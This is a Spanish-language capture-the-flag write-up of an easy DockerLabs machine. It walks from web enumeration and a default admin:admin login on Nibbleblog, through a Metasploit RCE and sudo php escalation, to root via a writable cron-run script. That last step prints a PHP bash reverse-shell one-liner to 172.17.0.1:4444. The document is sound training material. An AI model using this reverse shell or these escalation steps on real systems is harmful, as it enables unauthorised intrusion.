
**IP**:  172.17.0.3
**S.O**: Linux
**Source:** DockeLabs
**Level:** Fácil
**Date:** 17 enero 2026
**Autor**:
**Descripción**: 

Web Enumeration
Nibbleblog Enumeration
Explotación Nibbleblog con Metasploit
[[Escalada de Privilegios#**Escalada de Privilegios mediante Sudo**]] - php
Enumeración del Sistema de Archivos
Enumeración de procesos
[[Escalada de Privilegios#**Escala de Privilegios mediante Cron Jobs]]

**Flags**:  


**Begin**:

---
### **Reconocimiento**:

Comenzamos haciendo un ping:
![Pasted image 20260117153705.png](../../_assets/cbcca9620b2accf20d871155347451b609684c3021778a14521af9969d48ad6f.png)
Hay conexión 
TTL: 64 -> Linux

Hacemos un escaneo de puertos
![Pasted image 20260117153725.png](../../_assets/3a7a8f85d95237128bb47873b8e0bbb826910f2eb4ee4fa292a5b702f2aaac39.png)
Puertos abiertos: 
Puertos 80 (HTTP)

Escaneo de versión al puertos específico 80. 
![Pasted image 20260117153811.png](../../_assets/73a0648aa840a3bb9c1f45decdef6f5c74438b9c16fb56b022e336523148477b.png)

### **Enumeración**

Accedemos a la pagina web
![Pasted image 20260117153801.png](../../_assets/b7e987a3ee926dab92bae29399043cc94622d77c5a5517969f11178eb0eba415.png)
El servidor respondió con la página por defecto de Apache2 en Debian

Realizamos un fuzzing de directorios.
![Pasted image 20260117154054.png](../../_assets/915899203aa618a04b781d8e7645829ba7c697eae745185829fd879b862f8592.png)
No encontramos nada

Mirando el codigo fuente vemos un ruta llamada `/nibbleblog`
![Pasted image 20260117154548.png](../../_assets/9a47642f68b380a1213549b7f8a965c04702745d737bd2a15eeb826a77ebccf9.png)

Accedemos a ella 
![Pasted image 20260117154704.png](../../_assets/dd61635652e49720c5f0945244e92c737a7b693ef20e09866444127e61082429.png)
Dentro de la pagina tambien vemos tambien la ruta de `http://172.17.0.2/nibbleblog/admin.php`

Nos dirigimos ahí
![Pasted image 20260117154751.png](../../_assets/d91f942f2034cb96203b2fb32c0b5aae8768eb06b886530ae8acc6c1166570f9.png)
Y vemos un formulario de login 

Probamos ingresar con las credenciales de `admin:admin`.
Y logramos ingresar.
![Pasted image 20260117154807.png](../../_assets/da7183a9132ed16d1040cf0061361440945256d75dd84da5047c0d91d904a305.png)

Vemos la versión del CMS
![Pasted image 20260117154921.png](../../_assets/707ce34988f8dd517fab0f273094780e39cb68e08db8e6da251ef2ded94030e5.png)

La buscamos en `searchploit`
![Pasted image 20260117155047.png](../../_assets/e172ec6d07073b1f5841d4fc747efc77f0bd881b8173f0794d6a0c1ae2bf662e.png)
Y vemos que si es vulnerable aquella versión a un RCE y el exploit lo podemos encontrar en **Metasploit**.

Accedemos a **Metasploit**.
![Pasted image 20260117155435.png](../../_assets/2eeb457b0707a572d4beff07b24df3b64aebe5e4237297c0214c2944a24ee5d3.png)

La buscamos.
![Pasted image 20260117155502.png](../../_assets/e61873f09fb4b307d2446ea9476a666bfa997c4a0dac88f0ecfe0a75fd625a9a.png)

### **Explotación**

Y usamos el `exploit 0`.
```bash
msf > use 0
```
![Pasted image 20260117155802.png](../../_assets/e03852453f94769923487699ac0d54150b71ae8c56e02e6d5e6a640596561f23.png)

Vemos las opciones que requiere para ejecutar el exploit.
![Pasted image 20260117155914.png](../../_assets/f7f8f7af98a129949c2a30eb1d567021043cfff2478186b770a4a9c3000cbc52.png)

Completamos las opciones requeridas.
![Pasted image 20260117160438.png](../../_assets/5fab9764f8ac35b8647a8935e956875c24d4094ce2f48ad59920c1bfeb84b5da.png)
Y le damos a `run`

Y logramos obtener una sesión meterpreter
![Pasted image 20260117160537.png](../../_assets/6c058146659aaa72174785dafa7361d3baf1d76fe518dce7f52980dbac7eb1b5.png)

### **Post-Explotación**

Listamos los permisos sudo
![Pasted image 20260117160550.png](../../_assets/03bb47163d4da2fd1ba0f7124fc9a5bce68f1ba5503cfcbcfdcb9f9d215b2d6a.png)
vemos que podemos ejecutar `/usr/bin/php` como chocolate sin necesidad de una contraseña.

Escalamos al usuario `chocolate` haciendo un llamado a una shell usando `/usr/bin/php`.
![Pasted image 20260117160702.png](../../_assets/b4db4051056014780404f432bc9cdf2fc71eab321f9887e1e376f71cb296464f.png)

Hacemos una enumeración del Sistema de Archivos
En el directorio `/opt` encontramos un script.php
![Pasted image 20260117160851.png](../../_assets/8ce90afa8776542b6a086f1041a8381a04a75a5ca070da0ddda6c45310391c14.png)

El cual vemos que se esta ejecutando en segundo plano
![Pasted image 20260117161552.png](../../_assets/4dd495f5a10044fdcb350b290ce6af18f21156ff333c589a3d4a4ad854abd10f.png)
Vemos que el archivo `sript.php` el usuario **root** lo ejecuta cada 5s

Verificamos los permisos que tenemos sobre `script.php`
![Pasted image 20260117162506.png](../../_assets/8ad200576c5719667eba8fea4c772ecd5d1f6c3d42ef7e89ae6e247c8febdd51.png)
Vemos que podemos escribir

Entonces lo editamos poniéndole haciendo que invoque una reverse **shell** por en puerto `4444`.
```bash
echo '<?php exec("/bin/bash -c \"bash -i >& /dev/tcp/172.17.0.1/4444 0>&1\""); ?>' > script.php
```
![Pasted image 20260117162821.png](../../_assets/b648cf002f8898bacf585b553175ac986cf7dae9a53c8e38b9d2cb05d71ca52d.png)

Ponemos el puerto en escucha y 5s luego nos da la **shell** con permisos de root.
![Pasted image 20260117162839.png](../../_assets/869c605f575c373a96fafca2456cc0b7e13903ba8fce378c89e6a1f106e9012f.png)

Escalada exitosa a root.
![Pasted image 20260117162850.png](../../_assets/a61fbca6f53cf73e9663513388b357ac74cb0dccbf10a283e9c8ac61f3a3932d.png)




